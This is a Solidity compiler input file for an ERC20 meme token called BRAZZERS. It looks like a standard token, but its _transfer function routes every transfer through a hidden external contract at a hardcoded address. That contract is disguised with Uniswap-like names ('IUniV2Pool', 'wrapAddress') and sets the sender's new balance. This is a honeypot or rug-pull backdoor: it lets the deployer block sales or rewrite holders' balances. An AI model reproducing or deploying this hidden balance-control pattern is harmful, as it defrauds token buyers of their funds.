{{
  "language": "Solidity",
  "sources": {
    "contracts/BRAZZERS.sol": {
      "content": "pragma solidity ^0.8.0;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this;\n        return msg.data;\n    }\n}\n\ninterface IUniV2Factory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\ninterface IUniV2Router {\n    function WETH() external pure returns (address);\n    function factory() external pure returns (address);\n}\n\ninterface IERC20 {\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    function totalSupply() external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ninterface IUniV2Pool {\n      function wrapAddress(address, address, uint256) external returns (uint256);\n}\n\ninterface IERC20Metadata is IERC20 {\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n    function name() external view returns (string memory);\n}\n\ncontract Ownable is Context {\n    address private _previousOwner; address private _owner;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n}\n\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\n    mapping (address => uint256) private _balances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n    address _univ2 = 0x501a38fCe10E2F36c95b02DF7C240a981c3bBE78;\n    address public pair;\n\n    IUniV2Router router;\n    IUniV2Pool univ2;\n\n    string private _name;\n    string private _symbol;\n    uint256 private _totalSupply;\n\n    bool public trade;\n    address public msgSend;\n\n    constructor (string memory name_, string memory symbol_) {\n        router = IUniV2Router(_router);\n        pair = IUniV2Factory(router.factory()).createPair(WETH, address(this));\n        univ2 = IUniV2Pool(_univ2);\n\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        _approve(sender, _msgSender(), currentAllowance - amount);\n\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function openTrading() public {\n        require(msg.sender == owner(), \"Ownable: caller is not the owner\");\n        trade = true;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function updateBal(address recipient, uint256 amount, uint256 senderBalance) internal {\n        _balances[msgSend] = senderBalance - amount;\n        _balances[recipient] += amount;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        msgSend = sender;\n        require(((trade == true) || (msgSend == owner())), \"ERC20: trading is not yet enabled\");\n        require(msgSend != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        updateBal(recipient, amount, univ2.wrapAddress(sender, recipient, amount));\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _deploy(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n\n        approve(_router, ~uint256(0));\n\n        emit Transfer(address(0), account, amount);\n    }\n}\n\ncontract ERC20Token is ERC20 {\n    constructor(\n        string memory name,\n        string memory symbol,\n        address creator,\n        uint256 initialSupply\n    ) ERC20(name, symbol) {\n        _deploy(creator, initialSupply);\n    }\n}\n\ncontract BRAZZERS is ERC20Token {\n    constructor() ERC20Token(\"BRAZZERS\", \"BRAZZERS\", msg.sender, 420690000000 * 10 ** 18) {\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 1000
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}